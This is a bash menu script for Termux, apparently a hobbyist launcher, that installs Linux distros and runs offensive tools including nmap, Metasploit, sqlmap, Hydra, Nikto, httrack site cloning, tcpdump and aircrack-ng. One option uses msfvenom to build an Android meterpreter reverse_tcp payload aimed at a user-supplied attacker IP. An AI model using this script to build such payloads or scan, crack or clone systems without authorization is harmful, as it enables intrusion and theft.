#!/bin/bash

green='\e[32m'
red='\e[31m'
blue='\e[34m'
yellow='\e[33m'
reset='\e[0m'

pkg install figlet -y
clear
figlet 'Jo Ba'

menu() {
    clear
    figlet 'Jo Ba'
    echo -e "${blue}=========== CUSTOM TERMINAL ===========${reset}"
    echo -e "${green}[1]${reset} Update & Install Packages"
    echo -e "${green}[2]${reset} Install Ubuntu on Termux"
    echo -e "${green}[3]${reset} Install Kali Linux on Termux"
    echo -e "${green}[4]${reset} Install Debian on Termux"
    echo -e "${green}[5]${reset} System Info"
    echo -e "${green}[6]${reset} Start VNC Server"
    echo -e "${green}[7]${reset} Start SSH Server"
    echo -e "${green}[8]${reset} Network Test"
    echo -e "${green}[9]${reset} Active Connections"
    echo -e "${green}[10]${reset} Whois Lookup"
    echo -e "${green}[11]${reset} Nmap Scan"
    echo -e "${green}[12]${reset} Run Metasploit"
    echo -e "${green}[13]${reset} Install SQLmap"
    echo -e "${green}[14]${reset} Create Payload"
    echo -e "${green}[15]${reset} Install Hydra"
    echo -e "${green}[16]${reset} Clone Websites"
    echo -e "${green}[17]${reset} Install Nikto"
    echo -e "${green}[18]${reset} Run tcpdump"
    echo -e "${green}[19]${reset} Install Aircrack-ng"
    echo -e "${green}[20]${reset} Install John The Ripper"
    echo -e "${green}[21]${reset} Exit"
    echo -e "${blue}=======================================${reset}"
    echo -n -e "${yellow}Choose an option: ${reset}"
    read option
}

execute() {
    case $option in
        1) apt update && apt upgrade -y && pkg install nano wget curl git python python3 ;;
        2) pkg install proot-distro -y && proot-distro install ubuntu ;;
        3) pkg install proot-distro -y && proot-distro install kali ;;
        4) pkg install proot-distro -y && proot-distro install debian ;;
        5) neofetch ;;
        6) pkg install tigervnc -y && vncserver :1 ;;
        7) pkg install openssh -y && sshd ;;
        8) ping -c 4 google.com ;;
        9) netstat -tulnp ;;
        10) echo -n "Enter domain: "; read domain; whois $domain ;;
        11) echo -n "Enter IP/Domain: "; read target; nmap -sS -A $target ;;
        12) pkg install metasploit -y && msfconsole ;;
        13) pkg install sqlmap -y && sqlmap --help ;;
        14) echo -n "Attacker IP: "; read ip; echo -n "Port: "; read port; echo -n "Format (apk, exe, sh): "; read format; msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -o payload.$format ;;
        15) pkg install hydra -y && hydra -h ;;
        16) pkg install httrack -y && echo -n "Enter URL: "; read url; httrack $url ;;
        17) pkg install nikto -y && echo -n "Enter target URL: "; read target; nikto -h $target ;;
        18) pkg install tcpdump -y && tcpdump -i any ;;
        19) pkg install aircrack-ng -y ;;
        20) pkg install john -y && john --help ;;
        21) echo "Exiting..."; exit 0 ;;
        *) echo -e "${red}Invalid option!${reset}" ;;
    esac
}

while true; do
    menu
    execute
    echo -e "${blue}Press Enter to continue...${reset}"
    read
done
